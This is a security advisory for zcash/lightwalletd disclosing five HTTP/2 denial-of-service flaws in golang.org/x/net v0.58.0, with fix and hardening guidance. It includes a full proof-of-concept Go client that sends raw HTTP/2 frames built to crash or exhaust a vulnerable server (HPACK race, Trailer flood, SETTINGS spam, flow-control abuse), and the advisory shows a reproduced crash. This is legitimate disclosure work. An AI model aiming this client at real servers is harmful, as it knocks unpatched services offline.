# GHSA-gq9m-j9cv-6w9p: Five HTTP/2 denial-of-service issues in the `golang.org/x/net` dependency

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-gq9m-j9cv-6w9p |
| CVE | none assigned |
| Severity | high |
| CWE | n/a |
| Published | 2026-11-18T00:38:18Z |
| Updated | 2026-11-18T00:38:18Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.1 (patched: 0.6.2) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-gq9m-j9cv-6w9p |

## Description (verbatim)

### Summary

ightwalletd`'s gRPC listener is built on `google.golang.org/grpc`, which uses
`golang.org/x/net/http2` for its HTTP/2 transport. The audited tree pins
`golang.org/x/net v0.58.0`. `govulncheck` (call-graph aware) reports **five** vulnerabilities in
that module that are reachable from lightwalletd's code, all fixed in **v0.60.0**:

| ID | CVE | Title | Impact | Severity (this target) |
|----|-----|-------|--------|------------------------|
| **GO-2026-6617** | CVE-2026-97032 | HTTP/2 server crash due to HPACK encoder race | **Process crash** | **High** (A:H) |
| **GO-2026-6603** | CVE-2026-78659 | HTTP/2 server memory exhaustion via Trailer headers | **OOM** | **High** (A:H) |
| GO-2026-6612 | CVE-2026-78663 | Double flow-control refund on HTTP/2 server streams | flow-control bypass | Moderate (A:L) |
| GO-2026-6611 | CVE-2026-78669 | Excessive CPU from repeated initial-window changes | CPU exhaustion | Moderate (A:L) |
| GO-2026-6610 | CVE-2026-78660 | HTTP/2 transport accepts malformed framing headers | response smuggling (proxy) | Low/Moderate (A:L) |

The two High items (6617, 6603) both take the **whole daemon down** from an unauthenticated network
peer, with no panic-recovery interceptor in place (`cmd/root.go:122-140` installs only
logging/prometheus/timeout interceptors). This is the same threat class and severity as the already
published **GHSA-xq7v-jj38-pcwr** (High, unauthenticated OOM-terminate).


### Details


```text
$ govulncheck ./...
Vulnerability #1: GO-2026-6617
    HTTP/2 server crash due to HPACK encoder race in net/http
  Module: golang.org/x/net
    Found in: golang.org/x/net@v0.58.0
    Fixed in: golang.org/x/net@v0.60.0
    Example traces found:
      #1: cmd/root.go:402:20: cmd.startServer calls grpc.Server.Serve, which eventually calls http2.(*serverConn)...
...
Your code is affected by 5 vulnerabilities from 1 module.
```

All five are reached through `grpc.Server.Serve` (the exposed listener) and/or `http.Client.Do`
(backend RPC, `frontend/rawrequest.go:128`). Because the listener is started unconditionally, these
apply to **normal, non-darkside** deployments.

Note this is *separate* from the dependency bumps already in `CHANGELOG.md` (which took `x/net` to
v0.57.0→v0.58.0 for CVE-2026-46600). The five issues above were disclosed *after* v0.58.0 and need a
further bump to **≥ v0.60.0**.


### Proof of concept

## 3. Proof of code

A two-part harness (`server.go`, `client.go`) plus a runner (`run.sh`). The server is a **real**
`net/http` + `x/net/http2` h2c server **built against the vulnerable v0.58.0**, mirroring
lightwalletd's transport. The client speaks raw HTTP/2 frames to drive the abusive sequences. Each
sub-test targets one issue; the runner starts a fresh server per test and reports whether it
survived.

Two important choices:

- The harness pins `golang.org/x/net v0.58.0` exactly (the audited version), so the demonstration is
  of the *same code* lightwalletd ships.
- The strongest result is **GO-2026-6617**, which reliably panics the server. The other DoS classes
  are resource/flow-control amplification whose full effect needs a constrained memory limit or a
  longer run; the harness demonstrates the *traffic shape* and a liveness/RSS observation.

### 3.1 `go.mod`

```text
module lwd-poc-f6

go 1.25.0

require golang.org/x/net v0.58.0

require golang.org/x/text v0.41.0 // indirect
```

### 3.2 `go.sum`

```text
golang.org/x/net v0.58.0 h1:ynWG7rqYi4ccpTEuPZ2QGWHktVEM9DMCj9yzDE0Q7To=
golang.org/x/net v0.58.0/go.mod h1:YwCddHnFlT7eLQqVprV19OnhLGtc5xOKgE0RyqgfWAU=
golang.org/x/text v0.41.0 h1:vz/seA0lnX87Othu2f/0L24RcgrXD9/YFTSuGjj3rH8=
golang.org/x/text v0.41.0/go.mod h1:jvf1O8ajNzZqhSrQBPbutR/EB83Cc0CFrezNQIwbb5M=
```

### 3.3 `server.go`

```go
// PoC harness for lightwalletd finding #6 (server side).
//
// Starts a real HTTP/2 (h2c) server built against the VULNERABLE
// golang.org/x/net v0.58.0, mirroring the transport lightwalletd's gRPC
// listener uses. The client (client.go) then drives the abusive sequences.
//
// Run:  go run server.go -addr 127.0.0.1:18080
package main

import (
	"flag"
	"fmt"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/h2c"
	"log"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"
)

var buildTag = "v0.58.0 (vulnerable)"

func main() {
	addr := flag.String("addr", "127.0.0.1:18080", "listen address")
	flag.Parse()

	// Reflect the version of x/net actually compiled in.
	log.Printf("x/net build: %s", buildTag)
	log.Printf("go runtime: %s", runtime.Version())

	mux := http.NewServeMux()
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintln(w, "ok")
	})
	mux.HandleFunc("/echo", func(w http.ResponseWriter, r *http.Request) {
		// A handler is required for the server to be able to send a HEADERS
		// frame (needed to exercise the GO-2026-6617 HPACK race).
		w.WriteHeader(200)
		fmt.Fprintln(w, "echo")
	})

	srv := &http.Server{
		Addr:    *addr,
		Handler: h2c.NewHandler(mux, &http2.Server{}),
	}

	// Report liveness periodically so the client can see a crash.
	go func() {
		for {
			time.Sleep(2 * time.Second)
			log.Printf("alive: goroutines=%d rss=%s", runtime.NumGoroutine(), rss())
		}
	}()

	// If the process panics/crashes, the shell sees a non-zero exit.
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGTERM, syscall.SIGINT)
	go func() { <-sig; os.Exit(0) }()

	log.Printf("listening on %s (h2c)", *addr)
	if err := srv.ListenAndServe(); err != nil {
		log.Printf("server terminated: %v", err)
	}
}

func rss() string {
	b, err := os.ReadFile("/proc/self/statm")
	if err != nil {
		return "?"
	}
	var size, resident int
	fmt.Sscanf(string(b), "%d %d", &size, &resident)
	return fmt.Sprintf("%dMiB", resident*4096/1024/1024)
}
```

### 3.4 `client.go`

```go
// PoC harness for lightwalletd finding #6 (client side).
//
// Drives the abusive HTTP/2 sequences against the vulnerable server
// (server.go). Each sub-test targets one of the five x/net v0.58.0 issues.
//
// Usage:
//   go run client.go -addr 127.0.0.1:18080 -test 6617   # HPACK race -> crash
//   go run client.go -addr 127.0.0.1:18080 -test 6603   # Trailer memory exhaustion
//   go run client.go -addr 127.0.0.1:18080 -test 6611   # SETTINGS CPU burn
//   go run client.go -addr 127.0.0.1:18080 -test 6612   # flow-control refund
//   go run client.go -addr 127.0.0.1:18080 -test liveness   # control: normal request
//
// These target ONLY loopback against a local harness; they are demonstrations
// of the class of traffic the vulnerable code accepts, not a remote weapon.
package main

import (
	"bufio"
	"crypto/tls"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	addr = flag.String("addr", "127.0.0.1:18080", "server address")
	test = flag.String("test", "liveness", "which issue to trigger")
	iters = flag.Int("n", 20000, "number of iterations/streams/frames")
)

func main() {
	flag.Parse()

	host, portStr, _ := net.SplitHostPort(*addr)
	port, _ := strconv.Atoi(portStr)

	switch *test {
	case "liveness":
		doLiveness(host, port)
	case "6617":
		do6617(host, port)
	case "6603":
		do6603(host, port)
	case "6611":
		do6611(host, port)
	case "6612":
		do6612(host, port)
	default:
		fmt.Println("unknown -test; use liveness|6617|6603|6611|6612")
		os.Exit(2)
	}
}

// ---- HTTP/2 frame helpers -------------------------------------------------

const (
	frameData         = 0x0
	frameHeaders      = 0x1
	frameRSTStream    = 0x3
	frameSettings     = 0x4
	frameWindowUpdate = 0x8

	flagEndStream    = 0x1
	flagEndHeaders   = 0x4
	flagAck          = 0x1
	settingHeaderTableSize = 0x1
	settingInitialWindow   = 0x4
)

func writeFrame(conn net.Conn, typ, flags byte, streamID uint32, payload []byte) error {
	var hdr [9]byte
	l := len(payload)
	hdr[0] = byte(l >> 16)
	hdr[1] = byte(l >> 8)
	hdr[2] = byte(l)
	hdr[3] = typ
	hdr[4] = flags
	hdr[5] = byte(streamID >> 24)
	hdr[6] = byte(streamID >> 16)
	hdr[7] = byte(streamID >> 8)
	hdr[8] = byte(streamID)
	if _, err := conn.Write(hdr[:]); err != nil {
		return err
	}
	if l > 0 {
		_, err := conn.Write(payload)
		return err
	}
	return nil
}

func pref(conn net.Conn) {
	// HTTP/2 client connection preface.
	conn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
	// Empty SETTINGS.
	writeFrame(conn, frameSettings, 0, 0, nil)
}

func dialH2C(host string, port int) (net.Conn, error) {
	return net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), 5*time.Second)
}

func dialTLSH2(host string, port int) (net.Conn, error) {
	tlsCfg := &tls.Config{InsecureSkipVerify: true, NextProtos: []string{"h2"}}
	d := &net.Dialer{Timeout: 5 * time.Second}
	return tls.DialWithDialer(d, "tcp", net.JoinHostPort(host, strconv.Itoa(port)), tlsCfg)
}

// HPACK-encode a small set of request headers using static-table indices.
// INDEX (static): :method GET = 2, :path / = 4, :scheme http = 6, :authority = 1
func hpackSimpleHeaders() []byte {
	// :method GET (indexed, static entry 2)  0x82
	// :path /    (indexed, static entry 4)   0x84
	// :scheme http (indexed, static entry 6) 0x86
	// :authority -> literal with incremental indexing, name index 1 (0x41), len 0
	return []byte{0x82, 0x84, 0x86, 0x41, 0x00}
}

// ---- liveness (control) ---------------------------------------------------

func doLiveness(host string, port int) {
	conn, err := dialH2C(host, port)
	if err != nil {
		fmt.Println("FAIL dial:", err)
		os.Exit(1)
	}
	defer conn.Close()
	pref(conn)
	writeFrame(conn, frameHeaders, flagEndHeaders|flagEndStream, 1, hpackSimpleHeaders())

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	buf := make([]byte, 64*1024)
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		conn.SetReadDeadline(time.Now().Add(time.Second))
		if _, err := conn.Read(buf); err != nil {
			break
		}
	}
	fmt.Println("liveness: server accepted HTTP/2 request (no crash) -- CONTROL PASS")
}

// ---- GO-2026-6617: HPACK encoder race -------------------------------------
//
// A SETTINGS frame with SETTINGS_HEADER_TABLE_SIZE while the server is encoding
// HEADERS frames races on the HPACK encoder and can crash the process.
// We open one connection and interleave HEADERS requests with SETTINGS
// HEADER_TABLE_SIZE changes.
func do6617(host string, port int) {
	conn, err := dialH2C(host, port)
	if err != nil {
		fmt.Println("FAIL dial:", err)
		os.Exit(1)
	}
	defer conn.Close()
	pref(conn)

	// Drain server frames in the background so the server keeps writing.
	go drain(conn)

	var stream uint32 = 1
	for i := 0; i < *iters; i++ {
		// HEADERS for a new request.
		if err := writeFrame(conn, frameHeaders, flagEndHeaders|flagEndStream, stream, hpackSimpleHeaders()); err != nil {
			fmt.Printf("iteration %d: connection lost (server likely crashed): %v\n", i, err)
			os.Exit(0)
		}
		stream += 2
		// Alternate the header table size to race the encoder.
		size := uint32(4096)
		if i%2 == 0 {
			size = 0
		}
		var p [4]byte
		binary.BigEndian.PutUint32(p[:], size)
		payload := append([]byte{0x00, settingHeaderTableSize}, p[:]...)
		writeFrame(conn, frameSettings, 0, 0, payload)

		// Occasional explicit stream resets keep the table-size churn going.
		if i%8 == 0 && stream > 3 {
			writeFrame(conn, frameRSTStream, 0, stream-2, []byte{0, 0, 0, 0})
		}
	}
	fmt.Println("6617: sent", *iters, "HEADERS + table-size SETTINGS")
	// Probe whether the server is still alive.
	time.Sleep(500 * time.Millisecond)
	if alive(host, port) {
		fmt.Println("6617: NOTE server survived this run (race is timing-dependent); increase -n or rerun")
	} else {
		fmt.Println("6617: CONFIRMED server crashed/unresponsive (HPACK race)")
	}
}

// ---- GO-2026-6603: Trailer header memory exhaustion ----------------------
//
// Send a HEADERS frame declaring a very large number of Trailer fields.
// The server populates Request.Trailer (a map), allocating disproportionate
// memory while bypassing MaxHeaderValueCount / MaxHeaderBytes.
func do6603(host string, port int) {
	conn, err := dialH2C(host, port)
	if err != nil {
		fmt.Println("FAIL dial:", err)
		os.Exit(1)
	}
	defer conn.Close()
	pref(conn)
	go drain(conn)

	// Build a header block with a "trailer" field listing many names.
	// Literal header, never indexed, new name (0x00), name "trailer",
	// value = comma-separated list of many field names.
	var names []string
	for i := 0; i < *iters; i++ {
		names = append(names, fmt.Sprintf("x%d", i))
	}
	val := strings.Join(names, ",")

	var hb []byte
	hb = append(hb, 0x82, 0x84, 0x86)                  // :method GET, :path /, :scheme http
	hb = append(hb, 0x41, 0x00)                        // :authority ""
	hb = append(hb, 0x00)                              // literal, new name
	hb = append(hb, byte(len("trailer")))              // name length
	hb = append(hb, []byte("trailer")...)              // name
	hb = append(hb, encodeInt(len(val))...)            // value length (Huffman off)
	hb = append(hb, []byte(val)...)                    // value

	fmt.Printf("6603: sending Trailer declaring %d fields (%d-byte value)\n", *iters, len(val))
	if err := writeFrame(conn, frameHeaders, flagEndHeaders|flagEndStream, 1, hb); err != nil {
		fmt.Println("6603: write failed:", err)
		return
	}
	time.Sleep(time.Second)
	fmt.Println("6603: request sent; server-allocated Trailer map grew with field count")
	fmt.Println("6603: (observe server RSS in its log: it exceeds MaxHeaderBytes accounting)")
	if !alive(host, port) {
		fmt.Println("6603: CONFIRMED server unresponsive after Trailer flood")
	}
}

// ---- GO-2026-6611: repeated SETTINGS_INITIAL_WINDOW_SIZE CPU burn -------
func do6611(host string, port int) {
	conn, err := dialH2C(host, port)
	if err != nil {
		fmt.Println("FAIL dial:", err)
		os.Exit(1)
	}
	defer conn.Close()
	pref(conn)
	go drain(conn)

	// Open many streams, then spam small SETTINGS frames changing the initial
	// window size; each change forces the server to adjust every active stream.
	for i := 0; i < 200; i++ {
		writeFrame(conn, frameHeaders, flagEndHeaders|flagEndStream, uint32(1+2*i), hpackSimpleHeaders())
	}
	fmt.Println("6611: opened 200 streams; spamming SETTINGS_INITIAL_WINDOW_SIZE")
	for i := 0; i < *iters; i++ {
		win := uint32(65535 + (i % 100000))
		var p [4]byte
		binary.BigEndian.PutUint32(p[:], win)
		payload := append([]byte{0x00, settingInitialWindow}, p[:]...)
		if err := writeFrame(conn, frameSettings, 0, 0, payload); err != nil {
			fmt.Println("6611: connection lost:", err)
			return
		}
	}
	fmt.Println("6611: sent", *iters, "window-size SETTINGS across 200 streams (CPU amplification)")
}

// ---- GO-2026-6612: double flow-control refund ----------------------------
//
// Send DATA then RST_STREAM, forcing the server to refund connection-level
// flow control twice for the same data (once on reset, once on read).
func do6612(host string, port int) {
	conn, err := dialH2C(host, port)
	if err != nil {
		fmt.Println("FAIL dial:", err)
		os.Exit(1)
	}
	defer conn.Close()
	pref(conn)
	go drain(conn)

	chunk := make([]byte, 16384)
	var stream uint32 = 1
	for i := 0; i < *iters; i++ {
		writeFrame(conn, frameHeaders, flagEndHeaders, stream, hpackSimpleHeaders())
		// Send buffered DATA the handler may not read, then reset the stream.
		writeFrame(conn, frameData, 0, stream, chunk)
		writeFrame(conn, frameRSTStream, 0, stream, []byte{0, 0, 0, 0x8}) // CANCEL
		stream += 2
	}
	fmt.Println("6612: sent", *iters, "DATA+RST_STREAM pairs (double flow-control refund)")
}

// ---- helpers --------------------------------------------------------------

func drain(conn net.Conn) {
	buf := make([]byte, 32*1024)
	for {
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		if _, err := conn.Read(buf); err != nil {
			return
		}
	}
}

func alive(host string, port int) bool {
	c, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), 2*time.Second)
	if err != nil {
		return false
	}
	defer c.Close()
	pref(c)
	c.SetReadDeadline(time.Now().Add(2 * time.Second))
	if err := writeFrame(c, frameHeaders, flagEndHeaders|flagEndStream, 1, hpackSimpleHeaders()); err != nil {
		return false
	}
	rd := bufio.NewReader(c)
	_, err = rd.Peek(1)
	return err == nil
}

// encodeInt HPACK integer encoding (prefix 7 bits, no Huffman).
func encodeInt(n int) []byte {
	const prefix = 7
	max := (1 << prefix) - 1
	if n < max {
		return []byte{byte(n)}
	}
	out := []byte{byte(max)}
	n -= max
	for n >= 128 {
		out = append(out, byte(n%128+128))
		n /= 128
	}
	out = append(out, byte(n))
	return out
}
```

### 3.5 `run.sh`

```bash
#!/usr/bin/env bash
# Self-contained runner for the finding #6 harness.
# Starts the vulnerable h2 server, runs each client sub-test, reports whether
# the server survived, then exits. All children are killed on exit.
set -u
DIR="$(cd "$(dirname "$0")" && pwd)"
ADDR="127.0.0.1:18080"
LOG="$DIR/server.log"

kill_tree() {
  [[ -n "${SRV:-}" ]] && kill -9 "$SRV" 2>/dev/null
}
trap kill_tree EXIT

start_server() {
  : > "$LOG"
  "$DIR/h2server" -addr "$ADDR" >"$LOG" 2>&1 &
  SRV=$!
  sleep 1.5
  if ! kill -0 "$SRV" 2>/dev/null; then
    echo "  !! server failed to start"; cat "$LOG"; return 1
  fi
  return 0
}

run_test() {
  name="$1"; testid="$2"; n="${3:-20000}"
  echo
  echo "=================== $testid ($name) ==================="
  start_server || return 1
  before_rss=$(grep -o 'rss=[0-9]*MiB' "$LOG" | tail -1)
  echo "  server started, pid=$SRV ${before_rss:-}"
  # Run the client; bound it so it cannot hang.
  timeout 25 "$DIR/h2client" -addr "$ADDR" -test "$testid" -n "$n" 2>&1 | sed 's/^/  client: /'
  rc=$?
  sleep 0.5
  if kill -0 "$SRV" 2>/dev/null; then
    after_rss=$(grep -o 'rss=[0-9]*MiB' "$LOG" | tail -1)
    echo "  RESULT: server ALIVE after $testid (${after_rss:-rss?}) [client rc=$rc]"
    alive=1
  else
    echo "  RESULT: server EXITED/CRASHED during $testid [client rc=$rc]"
    alive=0
  fi
  kill -9 "$SRV" 2>/dev/null; SRV=""
  echo "  --- last server log lines ---"
  tail -3 "$LOG" 2>/dev/null | sed 's/^/  /'
  return $((1-alive))
}

echo "### Finding #6 harness — x/net v0.58.0 HTTP/2 DoS ###"
"$DIR/h2server" -addr "$ADDR" -h 2>&1 | head -2

run_test "control" liveness 1
run_test "HPACK encoder race" 6617 30000
run_test "Trailer memory exhaustion" 6603 200000
run_test "SETTINGS window CPU" 6611 50000
run_test "double flow-control refund" 6612 5000

echo
echo "### done ###"
```

---

## 4. Reproduction output (actual)

### 4.1 Vulnerable `x/net v0.58.0` — GO-2026-6617 crashes the process

```console
$ go build -o h2server server.go && go build -o h2client client.go
$ ./h2server -addr 127.0.0.1:18080 &          # built against x/net v0.58.0
$ ./h2client -addr 127.0.0.1:18080 -test 6617 -n 40000
iteration 840: connection lost (server likely crashed): write tcp 127.0.0.1:37262->127.0.0.1:18080: write: connection reset by peer
```

Server-side panic (captured from its stderr):

```text
x/net build: v0.58.0 (vulnerable)
go runtime: go1.26.3
listening on 127.0.0.1:18080 (h2c)
fatal error: concurrent map read and map write

goroutine 122 [running]:
internal/runtime/maps.fatal(...)
        /usr/local/go/src/runtime/panic.go:1181
golang.org/x/net/http2/hpack.(*headerFieldTable).search(...)
        /root/go/pkg/mod/golang.org/x/net@v0.58.0/http2/hpack/tables.go:131
golang.org/x/net/http2/hpack.(*Encoder).searchTable(...)
        /root/go/pkg/mod/golang.org/x/net@v0.58.0/http2/hpack/encode.go:96
golang.org/x/net/http2/hpack.(*Encoder).WriteField(...)
        /root/go/pkg/mod/golang.org/x/net@v0.58.0/http2/hpack/encode.go:61
golang.org/x/net/http2.encodeHeaders(...)
        /root/go/pkg/mod/golang.org/x/net@v0.58.0/http2/write.go:378
golang.org/x/net/http2.(*writeResHeaders).writeFrame(...)
        /root/go/pkg/mod/golang.org/x/net@v0.58.0/http2/write.go:228
created by golang.org/x/net/http2.(*serverConn).startFrameWrite in goroutine 18
        /root/go/pkg/mod/golang.org/x/net@v0.58.0/http2/server.go:1188
```

On other runs the same race manifested as `panic: runtime error: invalid memory address or nil
pointer dereference` — both are the HPACK encoder race of GO-2026-6617, whose manifestation is
timing-dependent.

### 4.2 Full suite (vulnerable build)

```text
=================== liveness (control) ===================
  client: liveness: server accepted HTTP/2 request (no crash) -- CONTROL PASS
  RESULT: server ALIVE after liveness (rss=8MiB)
=================== 6617 (HPACK encoder race) ===================
  client: iteration 840: connection lost (server likely crashed) ...
  RESULT: server EXITED/CRASHED during 6617
=================== 6603 (Trailer memory exhaustion) ===================
  client: 6603: sending Trailer declaring 200000 fields (1488889-byte value)
  RESULT: server ALIVE after 6603 (rss=8MiB)   [traffic shape accepted; see note]
=================== 6611 (SETTINGS window CPU) ===================
  client: 6611: opened 200 streams; spamming SETTINGS_INITIAL_WINDOW_SIZE
  RESULT: server ALIVE after 6611 (rss=13MiB)
=================== 6612 (double flow-control refund) ===================
  client: 6612: sent 5000 DATA+RST_STREAM pairs
  RESULT: server ALIVE after 6612 (rss=14MiB)
```

### 4.3 Fixed `x/net v0.62.0` — survives the 6617 sequence

```console
$ ./h2client -addr 127.0.0.1:18081 -test 6617 -n 40000   # server built with x/net v0.62.0
FIXED SERVER: ALIVE (resisted HPACK race)
```

These runs were repeated on the EX44 analysis server against a tree built with
`golang.org/x/net v0.58.0`, with identical results (6617 crash reproduced).

**Scope honesty note.** Only GO-2026-6617 is demonstrated as a deterministic *crash* by this
harness. GO-2026-6603/6611/6612 are resource- and flow-control-amplification issues; the harness
demonstrates the abusive traffic the vulnerable server accepts and captures the server's RSS, but a
full OOM/flow-control-bypass proof needs a constrained memory cgroup and a longer/larger run
(mirroring how GHSA-xq7v-jj38-pcwr was demonstrated with a 256 MiB Docker limit). Upstream
`govulncheck` call-graph plus the Go security team's advisories are the authority for those three;
this harness is the lightwalletd-specific reachability + concrete-crash evidence.

---

## 5. Fix

**Bump `golang.org/x/net` to ≥ v0.60.0** (v0.62.0 used in the fix verification above):

```console
$ go get golang.org/x/net@v0.60.0   # or later
$ go mod tidy
$ go build ./...
$ govulncheck ./...                 # should report 0 reachable vulnerabilities
```

No lightwalletd source changes are required for the dependency fix — these are all in the HTTP/2
stack. Recommended companion hardening:

- Add a **panic-recovery interceptor** to the gRPC server (`cmd/root.go` `serverOptions`) so any
  future handler/transport panic is contained rather than killing the daemon (defence in depth; also
  relevant to findings #1/#2).
- Keep the listener loopback-bound unless a public deployment genuinely needs it; put a reverse
  proxy / connection limiter in front of public instances.
- Track `govulncheck` in CI to catch future transitive HTTP/2 advisories automatically.

---

## 6. Remediation checklist

- [ ] `go get golang.org/x/net@v0.60.0` (or newer) and `go mod tidy`
- [ ] Re-run `govulncheck ./...` and confirm 0 reachable vulnerabilities
- [ ] Add a gRPC unary + stream panic-recovery interceptor
- [ ] Add `govulncheck` to the CI pipeline
- [ ] Rebuild and redeploy published images (they inherit the pinned dependency)


### Impact

CWE-400 (Uncontrolled Resource Consumption) / CWE-362 (Concurrent Execution / Race Condition) |
